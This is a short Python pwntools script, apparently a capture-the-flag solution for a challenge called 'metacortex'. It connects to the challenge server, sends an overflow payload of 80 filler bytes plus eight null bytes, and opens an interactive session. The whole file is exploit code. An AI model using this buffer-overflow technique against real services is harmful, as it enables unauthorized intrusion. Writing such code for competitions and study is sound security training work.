from pwn import *

p = remote('chal.ctf.b01lers.com', 1014)
#p = process('./metacortex')

print p.recv()
payload = '0'*80+'\x00\x00\x00\x00\x00\x00\x00\x00'
p.sendline(payload)
p.interactive()
